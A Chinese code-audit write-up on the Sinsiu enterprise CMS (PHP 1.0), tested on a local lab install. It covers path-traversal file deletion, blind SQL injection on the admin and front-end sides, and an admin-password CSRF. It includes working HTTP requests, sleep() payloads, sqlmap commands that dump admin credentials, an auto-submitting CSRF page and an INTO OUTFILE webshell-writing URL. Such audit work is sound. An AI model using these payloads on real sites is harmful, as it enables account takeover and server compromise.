## 系统介绍

>  **CMS名称** ：新秀企业网站系统PHP版
>
>  **官网** ：[www.sinsiu.com](http://www.sinsiu.com/)
>
>  **版本** ：这里国光用的 **1.0 正式版** （官网最新的版本有毒，网站安装的时候居然默认使用远程数据库？？？迷之操作
> 那站长的后台密码岂不是直接泄露了？疑似远程数据库地址：[server.sinsiu.net](http://server.sinsiu.net/) ）
>
>  **下载地址** ：[蓝奏云](https://www.lanzous.com/i8tj53e)

Windows下使用PHPStudy可以直接安装，搭建起来还是很简单的。

## 防护策略

虽然这是一个不知名的小系统，但是安全加固还是考虑到的，很多本应该有漏洞的地方均被加固修复了，导致国光我一开始一直碰壁，=，=
废话不多说，下面直接列举本次审计碰到的一些坑。

## 伪造IP注入过滤

### 思路

首先在后台发现有记录用户IP的功能：

![](https://image.3001.net/images/20200128/1580179312_5e2f9f7005a2a.jpg!small)

哦豁，会不会有传说中的伪造IP地址注入攻击呢？？？使用数据库监测工具，发现在注册用户发表评论的时候。用户的IP地址也的确被带入SQL语句中查询了：

    
    
    select * from php_safe where saf_ip = '10.211.55.2'  and saf_action = 'message'
    

VSCode走起，根据关键词来查找相关功能代码：

 **include/function.php**

    
    
    //获取客户端IP
    function get_ip()
    {
        if(getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'),'unknown'))
        {
            $ip = getenv('HTTP_CLIENT_IP');
        }elseif(getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'),'unknown')){
            $ip = getenv('HTTP_X_FORWARDED_FOR');
        }elseif(getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'),'unknown')){
            $ip = getenv('REMOTE_ADDR');
        }elseif(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'],'unknown')){
            $ip = $_SERVER['REMOTE_ADDR'];
        }else{
            $ip = '0.0.0.0';
        }
        if(!is_numeric(str_replace('.','',$ip)))
        {
            $ip = '0.0.0.0';
        }
        return $ip; 
    }
    

### 结果

获取IP的关键防护代码：

    
    
    if(!is_numeric(str_replace('.','',$ip)))
    {
      $ip = '0.0.0.0';
    }
    

获取到的IP值，去除掉`.`后如果不是 **数字类型** 的话就重置为`0.0.0.0` ，扑街，这条思路行不通，赶紧换个思路去

## 存储型XSS过滤

### 思路

网站前台有留言功能，留言就会想到存储型XSS，2333 嗝：

![15797012978745.jpg](https://image.3001.net/images/20200128/1580179349_5e2f9f958951f.jpg!small)

### 结果

定位到留言函数的代码：

 **index/module/info_main.php**

    
    
    function add_message()
    {
        safe('message');
        global $global,$smarty,$lang;
        $mes_email = post('email');
        $mes_type = post('type');
        $mes_title = post('title');
        $mes_text = post('text');
        $mes_show = post('show');
        if($mes_email == '' || $mes_type == '' || $mes_title == '' || $mes_text == '')
        {
            $info_text = $lang['submit_error_info'];
        }else{
            $mes_add_time = time();
            if($mes_show != '2')
            {
                $mes_show = '0';
            }
            $obj = new message();
            $obj->set_value('mes_user_id',$global['user_id']);
            $obj->set_value('mes_type',$mes_type);
            $obj->set_value('mes_email',$mes_email);
            $obj->set_value('mes_title',$mes_title);
            $obj->set_value('mes_text',$mes_text);
            $obj->set_value('mes_add_time',$mes_add_time);
            $obj->set_value('mes_show',$mes_show);
            $obj->set_value('mes_lang',S_LANG);
            $obj->add();
            if(intval(get_varia('sentmail')))
            {
                $email_title = '您的网站有了新的留言';
                $email_text = "[$mes_type] $mes_title <br /> $mes_text";
                call_send_email($email_title,$email_text,$global['user_id'],$mes_email);
            }
            $info_text = $lang['submit_message'];
        }
        $smarty->assign('info_text',$info_text);
        $smarty->assign('link_text',$lang['go_back']);
        $smarty->assign('link_href',url(array('channel'=>'message')));    
    }
    

可以看到前台用户传入的数据经过了`post()`函数，追踪到`post()`函数的定义处：

 **include/function.php**

    
    
    function post($val,$filter = 'strict')
    {
        return $filter(isset($_POST[$val])?$_POST[$val]:'');
    }
    

??? 继续找到`strict`的定义处：

 **include/function.php**

    
    
    //严格过滤字符串中的危险符号
    function strict($str)
    {
        if(S_MAGIC_QUOTES_GPC)
        {
            $str = stripslashes($str);
        }
        $str = str_replace('<','&#60;',$str);
        $str = str_replace('>','&#62;',$str);
        $str = str_replace('?','&#63;',$str);
        $str = str_replace('%','&#37;',$str);
        $str = str_replace(chr(39),'&#39;',$str);
        $str = str_replace(chr(34),'&#34;',$str);
        $str = str_replace(chr(13).chr(10),'<br />',$str);
        return $str;
    }
    

可以发现 我们的存储XSS所用到的尖括号完全被过滤掉了：

    
    
    $str = str_replace('<','&#60;',$str);
    $str = str_replace('>','&#62;',$str);
    

这也导致了 管理员后台可以直接看到XSS Payload ,场面一度非常尴尬：

![15797018332062.jpg](https://image.3001.net/images/20200128/1580179373_5e2f9fad9bdaf.jpg!small)

用户评论的核心代码也被过滤了：

 **index/module/info_main.php**

    
    
    function add_comment()
    {
        safe('comment');
        global $global,$smarty,$lang;
        $channel = post('channel');
        $com_page_id = post('page_id');
        $com_email = post('email');
        $com_rank = post('rank');
        $com_text = post('text');
        if($channel == '' || $com_page_id == '' || $com_rank == '' || $com_email == '' || $com_text == '')
        {
            $info_text = $lang['submit_error_info'];
        }
      ...
      ...
    }
    

存储XSS 扑gai~

## 前台用户CSRF判断

### 思路

网站有留言板和文章评论，如何存在CSRF越权的话可以在评论或者留言处贴构造好的CSRF链接，来进行CSRF攻击。23333 感觉稳了！定位到相关功能代码：

 **index/module/user/deal.php**

    
    
    function edit_pwd()
    {
        safe('edit_pwd');
        global $global,$smarty,$lang;
        $old_pwd = post('old_pwd');
        $new_pwd = post('new_pwd');
        $re_pwd = post('re_pwd');
        if(strlen($old_pwd) < 6 || strlen($old_pwd) > 15 || strlen($new_pwd) < 6 || strlen($new_pwd) > 15 || $new_pwd != $re_pwd)
        {
            $info_text = $lang['submit_error_info'];
        }else{
            $use_password = md5($old_pwd);
            $obj = new users();
            $obj->set_where('use_id = '.$global['user_id']);
            $obj->set_where("use_password = '$use_password'");
            if($obj->get_count() > 0)
            {
                $use_password = md5($new_pwd);
                $obj->set_value('use_password',$use_password);
        ...
    ...
    }
    

### 结果

 **index/moudle/user/deal.php**

    
    
    // 这里需要提供旧密码
    $use_password = md5($old_pwd);
    $obj = new users();
    $obj->set_where('use_id = '.$global['user_id']);
    $obj->set_where("use_password = '$use_password'");
    if($obj->get_count() > 0)
    

没有旧密码 是不可能改密码的，所以CSRF攻击其他用户的想法GG

## 可控变量过滤

虽然作为一个CMS，用户可控变量很多，文章浏览等功能不可避免地要进行数据库操作，但是该系统基本上把所以可控变量都给过滤了。

### session 过滤

使用了`$filter = 'strict'`严格模式，关于`strict`函数细节可以参考文章上面贴的代码：

 **include/function.php**

    
    
    function set_session($name,$value,$filter = 'strict')
    {
        if(S_SESSION)
        {
            $_SESSION[$name] = $filter($value);
        }else{
            setcookie($name,$filter($value));
        }
    }
    //获取session
    function get_session($name,$filter = 'strict')
    {
        if(S_SESSION)
        {
            return $filter(isset($_SESSION[$name])?$_SESSION[$name]:'');
        }else{
            return $filter(isset($_COOKIE[$name])?$_COOKIE[$name]:'');
        }
    }
    

### cookie过滤

 **include/function.php**

    
    
    //获取cookie
    function get_cookie($name,$filter = 'strict')
    {
        return $filter(isset($_COOKIE[$name])?$_COOKIE[$name]:'');
    }
    

### 管理员登录过滤

 **admin/module/info_main.php**

    
    
    function admin_login()
    {
        safe('admin_login');
        global $smarty,$lang;
        $username = substr(post('username'),0,30);
        $password = substr(post('password'),0,30);
        if($username == '' || $password == '')
        {
            unset_session('admin_username');
            unset_session('admin_password');
            $info_text = '对不起，用户名和密码不能为空';
            $link_text = '返回重新登录';
        }
      ...
      ...
    }
    

### 普通用户登录过滤

 **index/module/info_main.php**

    
    
    function user_login()
    {
        safe('user_login');
        global $global,$smarty,$lang;
        $info_text = post('info_text');
        $link_text = post('link_text');
        $link_href = post('link_href');
        $username = post('username');
        $password = post('password');
      ...
      ...
    }
    

大致就这么多防护了，接下来开始真正地来进行漏洞挖掘。

# 漏洞分析

## 后台任意文件删除

### 漏洞分析

漏洞文件：`admin/deal.php`

 **deal.php**

    
    
    function del_file()
    {
        $path = post('path');
        $flag = false;
        $dir[0] = 'data/backup/';
        $dir[1] = 'images/';
        $dir[2] = 'resource/';
        for($i = 0; $i < count($dir); $i ++)
        {
            if(substr($path,0,strlen($dir[$i])) == $dir[$i])
            {
                $flag = true;
            }
        }
        if($flag)
        {
            if(unlink($path))
            {
                $result = 1;
            }
        }
        echo isset($result)?$result:0;
    }
    

这里核心看这处代码：

    
    
    if(substr($path,0,strlen($dir[$i])) == $dir[$i])
    {
      $flag = true;
    }
    

这是个删除文件的函数定义，删除文件用了白名单策略，必须只能删除：

    
    
    $dir[0] = 'data/backup/';
    $dir[1] = 'images/';
    $dir[2] = 'resource/';
    

这3个目录下的文件，使用了`substr`从`$path`的0位置开始往后判断，只校验了`$path`前面是否在白名单内部，但是却忽略了 白名单
**后面** 的路径可能使用`../`的这种形式来穿越目录。

### 漏洞利用

![15796571811634.jpg](https://image.3001.net/images/20200128/1580179405_5e2f9fcd5311c.jpg!small)  

抓取`删除` 这个操作的数据包，具体如下：

    
    
    POST /admin.php?/deal/ HTTP/1.1
    Host: 10.211.55.12
    Content-Length: 33
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
    Content-Type: application/x-www-form-urlencoded
    Accept: */*
    Origin: http://10.211.55.12
    Referer: http://10.211.55.12/admin.php?/file/mod-pic_lists/
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
    Cookie: PHPSESSID=7e2ofb2sbe5p0bhv8rcgfg5n84
    Connection: close
    
    cmd=del_file&path=images/../1.php
    

通过在白名单目录后面使用`../`可以实现跨目录任意文件删除，删除成功返回`1`

![15796572815670.jpg](https://image.3001.net/images/20200128/1580179435_5e2f9feb262cb.jpg!small)

## 后台盲注

后台盲注有好几处点，虽然可控变量基本上都被过滤了，但是却忽略 **数字型盲注**
不需要闭合单引号就可以直接拼接SQL语句导致盲注的产生，下面就找一个典型的例子来分析。

### 漏洞分析

![15797452089782.jpg](https://image.3001.net/images/20200128/1580179472_5e2fa0107a43f.jpg!small)

删除管理员账号这里存在数字型盲注，下面来看下细节代码：

 **admin/module/basic/deal.php**

    
    
    function del_admin()
    {
        global $global;
        $adm_id = post('id');
        $obj = new admin();
        $obj->set_where('adm_id = '.$global['admin_id']);
        $a = $obj->get_one();
        $obj->set_where('');
        $obj->set_where("adm_id = $adm_id");
        $b = $obj->get_one();
        if($obj->get_count())
        {
            if($a['adm_grade'] < $b['adm_grade'])
            {
                $obj->del();
                set_cookie('result',1);
            }
        }
        echo 1;
    }
    

比较关键的两处代码是：

    
    
    // admin_id 用户可控 虽然经过post过滤了
    $adm_id = post('adm_id');
    
    // post过滤后直接带入数据库操作
    $obj->set_where('adm_id = '.$global['admin_id']);
    

为了进一步分析，使用Burpsuite来抓取修改密码的数据包，具体如下：

    
    
    POST /admin.php?/deal/dir-basic/ HTTP/1.1
    Host: 10.211.55.12
    Content-Length: 18
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
    Content-Type: application/x-www-form-urlencoded
    Accept: */*
    Origin: http://10.211.55.12
    Referer: http://10.211.55.12/admin.php?/basic/mod-admin_list/index.html
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
    Cookie: PHPSESSID=7e2ofb2sbe5p0bhv8rcgfg5n84; user_username=111111; user_password=96e79218965eb72c92a549dd5a330112
    Connection: close
    
    cmd=del_admin&id=2
    

因为代码里面只返回1 `echo 1;` 所以这里注入的话只能使用 **数字型基于时间的盲注** 了：

![15797454141692.jpg](https://image.3001.net/images/20200128/1580179508_5e2fa0345f1c1.jpg!small)  

数据库监控工具来看一下后台执行了什么样的SQL语句：

    
    
    select * from php_admin where adm_id = 3
    

先延时再验证一下：

    
    
    cmd=del_admin&id=3 and sleep(10)
    

后台SQL语句:

    
    
    select * from php_admin where adm_id = 3 and sleep(10)
    

然鹅测试发现并没有延时反应，因为这里是删除用户，当这个用户的ID被删掉以后，用and语句前提是两边都是真才可以，所以这里得把 **and** 换成
**or** 语句：

![15797457421829.jpg](https://image.3001.net/images/20200128/1580179540_5e2fa05401841.jpg!small)

延时貌似误差比较大，实际延时的时长大概是理论延时的两倍左右。

既然知道有注入的话 ，下面开始验证吧。

### 漏洞利用

 **手工验证**

手工延时盲注是个细心的活，下面只举个基本例子：

    
    
    # 判断当前数据库长度
    # 当前数据库长度是否为 1 没有延时 不是
    cmd=del_admin&id=3 or if(length(database())=1,sleep(3),0)
    
    # 延时 表明当前数据库长度为 6
    cmd=del_admin&id=3 or if(length(database())=6,sleep(3),0)
    
    # 当前数据库第1个字母的ascii码是否为 97 没有延时 不是
    cmd=del_admin&id=3 or if(ascii(mid(database(),1,1))=97,sleep(3),0)
    
    # 延时 表明当前数据库第1个字母的ascii码为 115 即 's'
    cmd=del_admin&id=3 or if(ascii(mid(database(),1,1))=115,sleep(3),0)
    
    # 当前数据库第2个字母的ascii码是否为 97 没有延时 不是
    cmd=del_admin&id=3 or if(ascii(mid(database(),2,1))=97,sleep(3),0)
    
    # 延时 表明当前数据库第2个字母的ascii码为 105 即 'i'
    cmd=del_admin&id=3 or if(ascii(mid(database(),2,1))=105,sleep(3),0)
    
    ...
    

**SQLMap注入**

为啥不自己写脚本来注入呢？？？因为SQLMap本身很强大，这里不需要造轮子，很多人不了解SQLMap，认为现在基本上SQLMap注入不出来啥，实际上还是他们不够了解，SQLMap灵活程度非常高，远比自己造轮子写脚本快的多。下面直接上关键的用法参数吧：

    
    
    sqlmap -u "http://10.211.55.12//admin.php?/deal/dir-basic/" --cookie="PHPSESSID=7e2ofb2sbe5p0bhv8rcgfg5n84;" --data="cmd=del_admin&id=3" -p "id" --technique=T --random-agent -v 3 --tamper="between" -D 'sinsiu' -T 'php_admin' -C 'adm_id,adm_username,adm_password' --dump
    

**注入结果**

**![15797524747117.jpg](https://image.3001.net/images/20200128/1580179573_5e2fa075bf56f.jpg!small)**

细节

    
    
    -u "http://10.211.55.12//admin.php?/deal/dir-basic/"
    

实际上也可以 保存数据包为文本，然后`-r`，文本里面手动标 星号

    
    
    --cookie="PHPSESSID=7e2ofb2sbe5p0bhv8rcgfg5n84;"
    

因为这个是后台盲注，所以这里需要Cookie认证一下

    
    
    --data="cmd=del_admin&id=3"
    

手动写入POST数据包，将请求中提供对应发送的数据隐式地将 GET 改成 POST

    
    
    -p "id"
    

手动指出存在注入的参数

    
    
    --technique=T
    

手动指定 **时间型盲注** 的检测技术，SQLMap默认检测技术为 `BEUSTQ`

    
    
    --random-agent
    

好习惯，随机user-agent

    
    
    -v 3
    

国光自己的习惯，显示已注入的 payloads，国光习惯看SQLMap的payload，看多有助于学习先进的手工注入技术

    
    
    --tamper="between"
    

因为这个网站过滤了尖括号，所以介个插件，作用是`NOT BETWEEN 0 AND #`替换大于号`>`，`BETWEEN # AND #`替换等于号`=`

    
    
    -D 'sinsiu' -T 'php_admin' -C 'adm_id,adm_username,adm_password' --dump
    

日常操作，这里大家应该很熟悉了，国光就不再BB了

## 管理员CSRF

### 漏洞分析

修改管理员密码，没有验证就密码，直接提供新密码，而且没有Token验证来防御CSRF攻击：

 **admin/moudle/basic/deal.php**

    
    
    function edit_admin()
    {
        global $global,$smarty;
        $adm_id = post('adm_id');
        $adm_password = post('adm_password');
        $re_password = post('re_password');    
        $obj = new admin();
        $obj->set_where('adm_id = '.$global['admin_id']);
        $a = $obj->get_one();
        $obj->set_where('');
        $obj->set_where("adm_id = $adm_id");
        $b = $obj->get_one();
        $success = 0;
        if($obj->get_count())
        {
            if($a['adm_id'] == $b['adm_id'] || $a['adm_grade'] < $b['adm_grade'])
            {
                if(strlen($adm_password) >= 5 && $adm_password == $re_password)
                {
                    $obj->set_value('adm_password',md5($adm_password));
                    $obj->edit();
                    $success = 1;
                }
            }
        }
        if($success)
        {
            $info_text = '修改密码成功';
            $link_text = '返回列表页';
            $link_href = url(array('channel'=>'basic','mod'=>'admin_list'));
        }else{
            $info_text = '修改密码失败';
            $link_text = '返回上一页';
            $link_href = url(array('channel'=>'basic','mod'=>'admin_edit'));
        }
        $smarty->assign('info_text',$info_text);
        $smarty->assign('link_text',$link_text);
        $smarty->assign('link_href',$link_href);
    }
    

同理添加管理员也是这样：

 **admin/moudle/basic/deal.php**

    
    
    function add_admin()
    {
    	global $global,$smarty;
    	$adm_username = post('adm_username');
    	$adm_password = post('adm_password');
    	$re_password = post('re_password');	
    	$obj = new admin();
    	$obj->set_where('adm_id = '.$global['admin_id']);
    	$one = $obj->get_one();
    	$adm_grade = $one['adm_grade'] + 1;
    	$obj->set_where('');
    	$obj->set_where("adm_username = '$adm_username'");
    	if($obj->get_count() == 0 && strlen($adm_username) >= 5 && strlen($adm_password) >= 5 && $adm_password == $re_password)
    	{
    		$obj->set_value('adm_username',$adm_username);
    		$obj->set_value('adm_password',md5($adm_password));
    		$obj->set_value('adm_grade',$adm_grade);
    		$obj->add();
    		$info_text = '添加管理员帐号成功';
    		$link_text = '返回列表页';
    		$link_href = url(array('channel'=>'basic','mod'=>'admin_list'));
    	}else{
    		$info_text = '添加管理员帐号失败';
    		$link_text = '返回上一页';
    		$link_href = url(array('channel'=>'basic','mod'=>'admin_add'));
    	}
    	$smarty->assign('info_text',$info_text);
    	$smarty->assign('link_text',$link_text);
    	$smarty->assign('link_href',$link_href);
    }

### 漏洞利用

修改管理员密码为:Passw0rd 构造以下HTML页面：

    
    
    <html>
      <body>
      <script>history.pushState('', '', '/')</script>
        <form action="http://10.211.55.12/admin.php?/basic/index.html" method="POST">
          <input type="hidden" name="cmd" value="edit&#95;admin" />
          <input type="hidden" name="adm&#95;id" value="1" />
          <input type="hidden" name="adm&#95;password" value="Passw0rd" />
          <input type="hidden" name="re&#95;password" value="Passw0rd" />
        </form>
        <script> document.forms[0].submit(); </script>
      </body>
    </html>
    

下面实际来模拟一下攻击场景

攻击者将上述html保存到外网上，引诱管理员点击，然后自动触发CSRF攻击：

![15797656055943.jpg](https://image.3001.net/images/20200128/1580179599_5e2fa08fcbd07.jpg!small)  

管理员在后台 使用当前浏览器去访问这个地址的时候就中招了，这个html里面的修改密码表单会自动触发，GG

## 前台盲注

前面漏洞要么需要拿到后台，要么需要社工来CSRF攻击管理员，需要一些运气成分，但是这个洞就不需要了，这个洞产生点在网站的前台，可以直接进行注入。

### 漏洞分析

 **index/module/search_main.php**

    
    
    <?php
    function module_search_main()
    {
        global $global,$smarty;
        $global['key'] = rawurldecode($global['key']);
        $obj = new goods();
        $obj->set_field('goo_id,goo_title,goo_x_img');
        $obj->set_where("goo_title like '%" . $global['key'] . "%'");
        $obj->set_where('goo_channel_id = '.get_id('channel','cha_code','goods'));
        $len = get_varia('img_list_len');
        $obj->set_page_size($len ? $len : 12);
        $obj->set_page_num($global['page']);
        $sheet = $obj->get_sheet();
        for($i = 0; $i < count($sheet); $i ++)
        {
            $sheet[$i]['short_title'] = cut_str($sheet[$i]['goo_title'],10);
        }
        set_link($obj->get_page_sum());
        $smarty->assign('search',$sheet);
    }
    //新秀
    ?>
    

这里首先进行URL解码：

    
    
    $global['key'] = rawurldecode($global['key']);
    

然后就直接带入数据库查询了：

    
    
    $obj->set_where("goo_title like '%" . $global['key'] . "%'");
    

？？？不明白为啥这里大意了，明明其他地方过滤都很严格的...

### 漏洞利用

知道代码仅仅经过一次URL解码，所以尝试一下使用`%23`，解码后就是`#`来闭合后面的语句：

    
    
    http://10.211.55.12/?/search/index.html/key-%27%20and%20sleep(2)%20%23/
    

`%27and%20sleep(2)%20%23`URL解码为：`' and sleep(2) #` 使用MySQL监控工具查看日志：

    
    
    select goo_id,goo_title,goo_x_img from php_goods where goo_lang = 'zh-cn'  and goo_show = 1  and goo_title like '%' and sleep(2) #%'  and goo_channel_id = 1  order by goo_top desc,goo_index desc,goo_id desc
    

成功了，那么接下来使用SQLMap来进注入吧。

![15797679999023.jpg](https://image.3001.net/images/20200128/1580179619_5e2fa0a351ded.jpg!small)

    
    
    sqlmap -u "http://10.211.55.12/?/search/index.html/key-%27*%20%23/" -v 3 --technique=T -D 'sinsiu' -T 'php_admin' -C 'adm_id,adm_username,adm_password' --dump
    

因为这里`key-%27*%20%23` 国光我使用`*`给SQLMap预留好了，然后SQLMap直接注入即可：

![15797700768141.jpg](https://image.3001.net/images/20200128/1580179644_5e2fa0bcf2370.jpg!small)

### 理论情况

这部分纯理论测试，实际情况下一般没写入权限，但是还是记录一下吧。如果有大佬可以审计出后台getshell的话 欢迎评论区留言 这样就可以一条龙攻击了~~~

MySQL新版下`secure-file-priv`字段用来限制MySQL对目录的操作权限。先查看一下本地我们的MySQL是否有作限制

    
    
    mysql> show global variables like '%secure%';
    +------------------+-------+
    | Variable_name    | Value |
    +------------------+-------+
    | secure_auth      | OFF   |
    | secure_file_priv | NULL  |
    +------------------+-------+
    2 rows in set (0.00 sec)
    

  * secure_file_priv的值为null ，表示限制mysqld 不允许导入导出 

  * secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入导出只能发生在/tmp/目录下 

  * secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制

为了进行理论上漏洞测试，下面来修改一下MySQL配置文件，修改 **mysql.ini** 文件，在 **[mysqld]** 下加入:

    
    
    secure_file_priv=
    

重启MySQL服务即可生效：

    
    
    mysql> show global variables like '%secure%';
    +------------------+-------+
    | Variable_name    | Value |
    +------------------+-------+
    | secure_auth      | OFF   |
    | secure_file_priv |       |
    +------------------+-------+
    2 rows in set (0.00 sec)
    

写shell需要网站爆物理路径才可以，当代码没有检测异常操作的时候，遇到错误会直接报错泄露物理路径，这个CMS信息泄露的地方有很多，下面随便找几处：

    
    
    http://localhost/admin/admin.php
    http://localhost/admin/deal.php
    http://localhost/admin/info.php
    http://localhost/include/common.php
    http://localhost/index/info.php
    http://localhost/index/user.php
    ...
    

浏览器直接访问一个试试看：

![1579754352182.jpg](https://image.3001.net/images/20200128/1580179669_5e2fa0d518133.jpg!small)

获取到网站的物理路径为：

    
    
    C:\phpStudy\PHPTutorial\WWW\
    

OK，那么可以直接开始写shell了：

    
    
    http://10.211.55.12/?/search/index.html/key-%27union select 1,2,'<?php phpinfo();?>' into outfile 'C:\\phpStudy\\PHPTutorial\\WWW\\gg.php'%20%23/
    

shell写入目录为网站根目录下，文件名为gg.php

![15797700065507.jpg](https://image.3001.net/images/20200128/1580179689_5e2fa0e983d31.jpg!small)

## 总结

因为第一次做审计，所以写的比较啰嗦了，日后再审计其他系统的分析文章的话 会尽量简洁明了的。

 ***本文原创作者：国光，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

